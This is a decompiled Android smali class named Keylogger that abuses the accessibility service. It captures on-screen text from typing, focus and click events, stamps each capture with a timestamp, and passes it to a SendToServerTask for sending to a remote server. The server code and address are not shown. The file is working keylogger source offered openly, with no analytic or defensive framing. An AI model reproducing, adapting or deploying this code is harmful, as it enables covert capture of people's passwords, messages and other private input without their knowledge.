.class public Lcom/bshu2/androidkeylogger/Keylogger;
.super Landroid/accessibilityservice/AccessibilityService;
.source "Keylogger.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 99
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/accessibilityservice/AccessibilityService;-><init>()V

    return-void
.end method


# virtual methods
.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 16
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityEvent;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 69
    move-object/from16 v0, p0

    move-object/from16 v1, p1

    new-instance v8, Ljava/text/SimpleDateFormat;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    const-string v10, "MM/dd/yyyy, HH:mm:ss z"

    sget-object v11, Ljava/util/Locale;->US:Ljava/util/Locale;

    invoke-direct {v9, v10, v11}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    move-object v3, v8

    .line 70
    move-object v8, v3

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v9

    invoke-virtual {v9}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v8

    move-object v4, v8

    .line 72
    move-object v8, v1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v8

    sparse-switch v8, :sswitch_data_0

    .line 92
    :goto_0
    return-void

    .line 74
    :sswitch_0
    move-object v8, v1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 75
    new-instance v8, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;-><init>(Lcom/bshu2/androidkeylogger/Keylogger;)V

    move-object v6, v8

    .line 76
    move-object v8, v6

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/String;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    const/4 v11, 0x0

    new-instance v12, Ljava/lang/StringBuffer;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object v15, v13

    move-object v13, v15

    move-object v14, v15

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    move-object v14, v4

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, "|(TEXT)|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    move-object v13, v5

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    aput-object v12, v10, v11

    invoke-virtual {v8, v9}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v8

    .line 77
    goto :goto_0

    .line 80
    :sswitch_1
    move-object v8, v1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 81
    new-instance v8, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;-><init>(Lcom/bshu2/androidkeylogger/Keylogger;)V

    move-object v6, v8

    .line 82
    move-object v8, v6

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/String;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    const/4 v11, 0x0

    new-instance v12, Ljava/lang/StringBuffer;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object v15, v13

    move-object v13, v15

    move-object v14, v15

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    move-object v14, v4

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, "|(FOCUSED)|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    move-object v13, v5

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    aput-object v12, v10, v11

    invoke-virtual {v8, v9}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v8

    .line 83
    goto/16 :goto_0

    .line 86
    :sswitch_2
    move-object v8, v1

    invoke-virtual {v8}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 87
    new-instance v8, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;

    move-object v15, v8

    move-object v8, v15

    move-object v9, v15

    move-object v10, v0

    invoke-direct {v9, v10}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;-><init>(Lcom/bshu2/androidkeylogger/Keylogger;)V

    move-object v6, v8

    .line 88
    move-object v8, v6

    const/4 v9, 0x1

    new-array v9, v9, [Ljava/lang/String;

    move-object v15, v9

    move-object v9, v15

    move-object v10, v15

    const/4 v11, 0x0

    new-instance v12, Ljava/lang/StringBuffer;

    move-object v15, v12

    move-object v12, v15

    move-object v13, v15

    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V

    new-instance v13, Ljava/lang/StringBuffer;

    move-object v15, v13

    move-object v13, v15

    move-object v14, v15

    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V

    move-object v14, v4

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    const-string v14, "|(CLICKED)|"

    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v13

    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    move-object v13, v5

    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v12

    aput-object v12, v10, v11

    invoke-virtual {v8, v9}, Lcom/bshu2/androidkeylogger/Keylogger$SendToServerTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    move-result-object v8

    .line 89
    goto/16 :goto_0

    .line 72
    nop

    :sswitch_data_0
    .sparse-switch
        0x1 -> :sswitch_2
        0x8 -> :sswitch_1
        0x10 -> :sswitch_0
    .end sparse-switch
.end method

.method public onInterrupt()V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    return-void
.end method

.method public onServiceConnected()V
    .locals 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 63
    move-object v0, p0

    const-string v2, "Keylogger"

    const-string v3, "Starting service"

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move-result v2

    return-void
.end method
